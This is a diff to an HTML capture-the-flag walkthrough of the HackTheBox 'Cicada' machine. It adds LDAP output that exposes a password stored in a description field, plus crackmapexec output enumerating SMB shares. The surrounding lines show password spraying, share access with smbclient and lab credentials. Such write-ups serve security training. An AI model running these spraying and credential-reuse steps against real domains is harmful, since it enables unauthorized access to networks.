@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -121,7 +121,12 @@
           <p>Search interesting fields:</p>
           <pre><code class="language-bash">grep -i "description" scans/ldap_auth.txt</code></pre>
           <p>A description entry leaks another password:</p>
-          <pre><code class="language-text">aRt$Lp#7t*VQ!3</code></pre>
+          <pre><code class="language-text">description: Default container for upgraded user accounts
+description: Default container for upgraded computer accounts
+description: Default container for domain controllers
+description: Builtin system settings
+...
+description: Just in case I forget my password is aRt$Lp#7t*VQ!3</code></pre>
           <p>Map it to a user by spraying known usernames:</p>
           <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u users.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success</code></pre>
           <p>Result:</p>
@@ -134,6 +139,19 @@
           <h2>6. DEV share as David</h2>
           <p>Check readable shares:</p>
           <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares</code></pre>
+          <pre><code class="language-text">[eu-dedivip-5][10.10.14.153][moree39@htb-olsdstqtyr][~]$ crackmapexec smb 10.129.20.27 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+SMB         10.129.20.27    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.20.27    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
+SMB         10.129.20.27    445    CICADA-DC        [*] Enumerated shares
+SMB         10.129.20.27    445    CICADA-DC        Share           Permissions     Remark
+SMB         10.129.20.27    445    CICADA-DC        -----           -----------     ------
+SMB         10.129.20.27    445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.129.20.27    445    CICADA-DC        C$                              Default share
+SMB         10.129.20.27    445    CICADA-DC        DEV             READ
+SMB         10.129.20.27    445    CICADA-DC        HR              READ
+SMB         10.129.20.27    445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.129.20.27    445    CICADA-DC        NETLOGON        READ            Logon server share
+SMB         10.129.20.27    445    CICADA-DC        SYSVOL          READ            Logon server share</code></pre>
           <p>Connect to DEV:</p>
           <pre><code class="language-bash">smbclient //10.129.20.27/DEV -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3'</code></pre>
           <p>List files:</p>
@@ -255,3 +273,4 @@ $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force</code>
 </body>
 
 </html>
+
